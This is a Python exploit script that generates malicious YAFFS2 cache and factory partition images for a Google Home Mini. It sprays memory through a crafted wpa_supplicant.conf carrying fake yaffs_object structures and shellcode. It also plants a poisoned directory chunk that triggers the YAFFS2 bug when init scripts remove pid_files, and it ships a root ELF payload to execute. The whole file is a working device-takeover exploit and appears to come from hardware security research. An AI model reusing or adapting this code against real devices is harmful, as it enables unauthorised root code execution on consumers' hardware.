#!/usr/bin/env python

from struct import pack
from base64 import b64encode
import tarfile
from io import BytesIO
import argparse

from YAFFS2 import *


def generate_wpa_filler(target_address):
    """
    Return the content of the special wpa_supplicant.conf file
    Once interpreting this file, wpa_supplicant will fill the memory
    with yaffs_object-like structures. If by chance one of these structures
    ends up at target_address, the exploit will succeed.
    """

    yaffs_obj_addr = target_address
    my_dev_addr = yaffs_obj_addr - 120
    shellcode_addr = yaffs_obj_addr + 12 * 4

    #
    # Each block contains multiple yaffs__object structures
    # as well as a shellcode
    #
    block = b""
    for i in range(110):
        #
        # Fake Yaffs objects
        #
        block += pack("III" + "IIIIIIIII",
                      0x0fffffff, 0x0fffffff,
                      my_dev_addr,
                      my_dev_addr,
                      my_dev_addr,
                      0, 0,
                      shellcode_addr + 12*4 * (100-i-1),
                      shellcode_addr + 12*4 * (100-i-1) - 4,
                      shellcode_addr + 12*4 * (100-i-1) - 8,
                      0xdead,
                      0xdead
                      )

    block += open("shellcode/shellcode.bin", "rb").read()

    data = block * 32

    data = b64encode(data)  # blob-base64 are base64 encoded

    f = BytesIO()

    #
    # Writing these lines is mandatory for the
    # init.rc script to consider the configuration file
    # as valid
    #
    f.write(b"ctrl_interface=/data/wifi\n")
    f.write(b"update_config=1\n")
    f.write(b"country=US\n")

    #
    # Fill actual AP data, so the Google Home Mini will be accessible
    # via WiFi
    #
    f.write(b"network={\n")
    f.write(b"ssid=\"GMINI\"\n")
    f.write(b"psk=eaa956726e95bba1dc63dccfe6a699cf203535bdac3eeeb6173ef18f41a78150\n")
    f.write(b"}\n")

    #
    # Create a large number of blob-base64 to fill the memory
    #
    for i in range(400):
        f.write(b"blob-base64-f"+str(i).encode()+b"={\n")
        for i in range(0, len(data), 128):
            f.write(data[i:i+128] + b"\n")
        f.write(b"}\n")

    return f.getvalue()


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Generate YAFFS2 filesystems")
    parser.add_argument(
        "address", help="Guess of the fake yaffs_obj target address in lowmem area")
    parser.add_argument("output", help="Output filename")
    args = parser.parse_args()

    #
    # Build cache YAFFS2 partition (the actual exploit payload)
    #

    partition = Yaffs2Partition()

    # Fill the partition with the minimal amount of files
    # for the system to boot until the YAFFS2 bug
    # is triggered

    tar = tarfile.open("cache_skeleton.tar", "r")

    for obj in tar.getmembers():
        if obj.name in [".", "./lost+found", "./.data/wifi/wpa_supplicant.conf"]:
            continue
        if obj.isdir():
            partition.add_dir(obj.name, obj.mode, obj.uid, obj.gid)
        elif obj.issym():
            partition.add_sym(obj.name, obj.linkname,
                              obj.mode, obj.uid, obj.gid)
        else:
            print(f"Unsupported object {obj}")
            exit(-1)

    # Create specially crafter wpa_supplicant.conf
    # This will fill the memory with fake yaffs_object structures

    fake_objet_address = int(args.address, 16)
    mem_filler = generate_wpa_filler(fake_objet_address)
    partition.add_file("./.data/wifi/wpa_supplicant.conf",
                       mem_filler, mode=384, gid=1008, uid=1008)

    partition.add_dir("./.data/watchdog/")

    partition.finish_block()

    # Manually add the "./.data/watchdog/pid_files" directory.
    # This is the folder that will be removed by the init scripts
    chunk = Yaffs2Chunk()
    chunk.hdr.type = 3
    chunk.hdr.parent_obj_id = partition.get_id("./.data/watchdog/")
    chunk.hdr.name = b"pid_files"

    chunk.oob.seq_number = partition.current_seq_number
    chunk.oob.obj_id = partition.current_obj_id + 1
    chunk.oob.chunk_id = 0
    chunk.oob.n_bytes = 0

    partition.add_chunk(chunk)

    # Evil chunk, will poison the "./data/watchdog/pid_files" folder.
    chunk = Yaffs2Chunk()
    chunk.hdr.type = 3  # YAFFS_DIR
    chunk.hdr.parent_obj_id = 0
    chunk.hdr.name = b"pid_files"

    chunk.oob.seq_number = partition.current_seq_number  # Same as pid_file/
    chunk.oob.obj_id = partition.current_obj_id + 1  # Same as pid_file/

    # Compute chunk_id and n_bytes so that removing pid_file
    # will consider the object at fake_objet_address
    chunk.oob.chunk_id = (fake_objet_address+0x20) // 0x800 + 1
    chunk.oob.n_bytes = (fake_objet_address+0x20) - \
        (chunk.oob.chunk_id-1) * 0x800

    partition.add_chunk(chunk)

    f = open(f"cache_{args.output}", "wb")
    partition.save(f)
    f.close()

    #
    # Build factory YAFFS2 partition (contains ELF to execute)
    #

    partition = Yaffs2Partition()

    # Fill the partition with the minimal amount of files
    # for the system to boot until the YAFFS2 bug
    # is triggered

    tar = tarfile.open("factory_skeleton.tar", "r")

    for obj in tar.getmembers():
        if obj.name in [".", "./lost+found"]:
            continue
        if obj.isdir():
            partition.add_dir(obj.name, obj.mode, obj.uid, obj.gid)
        elif obj.issym():
            partition.add_sym(obj.name, obj.linkname,
                              obj.mode, obj.uid, obj.gid)
        elif obj.isfile():
            content = tar.extractfile(obj).read()
            partition.add_file(obj.name, content, obj.mode, obj.uid, obj.gid)
        else:
            print(f"Unsupported object {obj}")
            exit(-1)

    # Add the ELF file to execute
    partition.add_file("./s", open("shellcode/s", "rb").read(),
                       mode=777, uid=0, gid=0)

    f = open(f"factory_{args.output}", "wb")
    partition.save(f)
    f.close()
